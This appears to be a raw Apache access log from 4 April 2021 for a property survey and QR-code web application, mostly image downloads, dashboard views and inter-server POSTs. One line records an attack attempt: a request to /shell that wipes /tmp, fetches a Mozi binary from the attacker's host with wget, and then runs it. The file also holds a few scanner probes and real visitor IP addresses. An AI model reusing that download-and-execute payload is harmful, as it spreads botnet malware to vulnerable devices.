47.29.109.161 - - [04/Apr/2021:10:23:36 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404083616.jpeg HTTP/1.1" 200 18157 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404083947.jpeg HTTP/1.1" 200 32970 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404083947.jpeg HTTP/1.1" 200 26121 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404084502.jpeg HTTP/1.1" 200 33977 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404084502.jpeg HTTP/1.1" 200 30588 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404084653.jpeg HTTP/1.1" 200 40709 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2117089.jpeg HTTP/1.1" 200 35979 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404084653.jpeg HTTP/1.1" 200 48581 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_2117089.jpeg HTTP/1.1" 200 34011 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2092930.jpeg HTTP/1.1" 200 33391 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_2092930.jpeg HTTP/1.1" 200 43335 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2100538.jpeg HTTP/1.1" 200 36113 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_2100538.jpeg HTTP/1.1" 200 42562 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/property_pic/pic_property_2109221.jpeg HTTP/1.1" 200 40236 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2109221.jpeg HTTP/1.1" 200 57512 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404093401.jpeg HTTP/1.1" 200 40414 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:37 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404092534.jpeg HTTP/1.1" 200 49841 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404093401.jpeg HTTP/1.1" 200 38569 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404092534.jpeg HTTP/1.1" 200 49009 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2090023.jpeg HTTP/1.1" 200 25616 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/property_pic/pic_property_2090023.jpeg HTTP/1.1" 200 43920 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404094130.jpeg HTTP/1.1" 200 30476 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404094130.jpeg HTTP/1.1" 200 32869 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404094631.jpeg HTTP/1.1" 200 31544 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404094631.jpeg HTTP/1.1" 200 39434 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:38 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404094951.jpeg HTTP/1.1" 200 25714 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404094951.jpeg HTTP/1.1" 200 42083 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404095429.jpeg HTTP/1.1" 200 30713 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404095429.jpeg HTTP/1.1" 200 31563 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404100115.jpeg HTTP/1.1" 200 44927 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/property_pic/pic_property_2049608.jpeg HTTP/1.1" 200 24490 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404100958.jpeg HTTP/1.1" 200 30447 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404100115.jpeg HTTP/1.1" 200 52122 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404100958.jpeg HTTP/1.1" 200 25406 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:23:39 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:23:39 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_2049608.jpeg HTTP/1.1" 200 45713 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:40 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404101535.jpeg HTTP/1.1" 200 43926 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:40 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404102043.jpeg HTTP/1.1" 200 29842 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:40 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_TPID520210404101535.jpeg HTTP/1.1" 200 46496 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:40 +0530] "GET /psc/download/w58/property_pic/pic_property_TPID520210404102043.jpeg HTTP/1.1" 200 32014 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:40 +0530] "GET /psc/download/w58/property_pic/pic_property_1192013.jpeg HTTP/1.1" 200 38671 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:23:40 +0530] "GET /psc/download/w58/qrcode_pic/pic_qrcode_1192013.jpeg HTTP/1.1" 200 46045 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
::1 - - [04/Apr/2021:10:23:45 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) mod_wsgi/4.5.17 Python/3.6 (internal dummy connection)"
164.52.207.234 - - [04/Apr/2021:10:24:04 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:24:04 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
157.42.211.162 - - [04/Apr/2021:10:24:04 +0530] "GET /psc/dashboard HTTP/1.1" 200 563180 "http://164.52.207.234/psc/home" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:24:12 +0530] "GET /psc/assets/images/favicon.png HTTP/1.1" 200 15817 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
157.42.211.162 - - [04/Apr/2021:10:24:20 +0530] "GET /psc/manageproperty/surveyorWiseQRInstalled HTTP/1.1" 200 6026 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:24:53 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:25:03 +0530] "POST /psc/manageproperty/savePropertyRemark/ HTTP/1.1" 200 441 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:25:03 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
157.42.211.162 - - [04/Apr/2021:10:25:12 +0530] "-" 408 0 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:25:22 +0530] "POST /psc/manageproperty/savePropertyRemark/ HTTP/1.1" 200 441 "http://164.52.207.234/psc/manageproperty/propertyaudit" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:25:34 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:25:51 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:27:02 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:27:46 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
223.230.142.14 - - [04/Apr/2021:10:27:52 +0530] "GET /psc/ HTTP/1.1" 200 2029 "-" "Mozilla/5.0 (Linux; Android 11; RMX2161) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
223.230.142.14 - - [04/Apr/2021:10:27:58 +0530] "POST /psc/home/authorizationnosql HTTP/1.1" 303 367 "http://164.52.207.234/psc/" "Mozilla/5.0 (Linux; Android 11; RMX2161) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:27:58 +0530] "GET /psc/upload/wardboundary/allWard.geojson HTTP/1.0" 200 1657006 "-" "-"
164.52.207.234 - - [04/Apr/2021:10:27:59 +0530] "GET /psc/download/weekly_data_2021-04-04.json HTTP/1.0" 200 412 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:28:02 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
223.230.142.14 - - [04/Apr/2021:10:27:58 +0530] "GET /psc/dashboard HTTP/1.1" 200 563161 "http://164.52.207.234/psc/" "Mozilla/5.0 (Linux; Android 11; RMX2161) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:28:20 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
223.230.142.14 - - [04/Apr/2021:10:28:20 +0530] "POST /psc/dashboard/getWardMapDetails/8 HTTP/1.1" 200 11554 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Linux; Android 11; RMX2161) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
164.52.207.234 - - [04/Apr/2021:10:28:30 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
223.230.142.14 - - [04/Apr/2021:10:28:30 +0530] "GET /psc/dashboard/overallwardinfo/8 HTTP/1.1" 200 69388 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Linux; Android 11; RMX2161) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:28:42 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:28:51 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:28:54 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
223.230.142.14 - - [04/Apr/2021:10:29:22 +0530] "-" 408 0 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:29:51 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:29:57 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:30:14 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:30:16 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:30:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:30:38 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:31:37 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:32:26 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:32:30 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
168.197.161.24 - - [04/Apr/2021:10:32:34 +0530] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:32:51 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
178.175.42.89 - - [04/Apr/2021:10:33:49 +0530] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://178.175.42.89:43066/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 493 "-" "Hello, world"
185.161.208.252 - - [04/Apr/2021:10:33:52 +0530] "HEAD / HTTP/1.1" 200 302 "-" "python-requests/2.18.4"
185.161.208.252 - - [04/Apr/2021:10:33:53 +0530] "GET / HTTP/1.1" 200 3440 "-" "python-requests/2.18.4"
164.52.206.209 - - [04/Apr/2021:10:34:15 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:34:29 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
205.185.122.102 - - [04/Apr/2021:10:34:32 +0530] "GET /config/getuser?index=0 HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
164.52.206.209 - - [04/Apr/2021:10:34:52 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:34:57 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:35:02 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:35:13 +0530] "POST /psc/interserverapi/isDuplicate HTTP/1.1" 200 415 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:35:24 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:35:37 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:36:07 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:36:08 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:36:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:37:00 +0530] "POST /psc/interserverapi/isDuplicate HTTP/1.1" 200 397 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:37:00 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:37:33 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:37:44 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:38:05 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:38:47 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:38:49 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:39:03 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:39:13 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:39:21 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:39:44 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:39:50 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:39:56 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:40:30 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:40:31 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:40:54 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:40:58 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:41:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:41:42 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:41:46 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:42:03 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:43:22 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
47.29.109.161 - - [04/Apr/2021:10:43:35 +0530] "GET /psc/manageproperty/dateWiseQRInstalled HTTP/1.1" 200 6246 "http://164.52.207.234/psc/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:43:36 +0530] "GET /psc/dist/chart/utils.js HTTP/1.1" 200 1777 "http://164.52.207.234/psc/manageproperty/dateWiseQRInstalled" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
47.29.109.161 - - [04/Apr/2021:10:43:36 +0530] "GET /psc/dist/chart/Chart.js HTTP/1.1" 200 106157 "http://164.52.207.234/psc/manageproperty/dateWiseQRInstalled" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
164.52.206.209 - - [04/Apr/2021:10:43:52 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:44:10 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:44:52 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:45:09 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:45:19 +0530] "GET /psc/upload/wardboundary/ward8.geojson HTTP/1.0" 200 30726 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:46:06 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:46:55 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
164.52.206.209 - - [04/Apr/2021:10:47:00 +0530] "POST /psc/interserverapi/saveimage HTTP/1.1" 200 410 "-" "-"
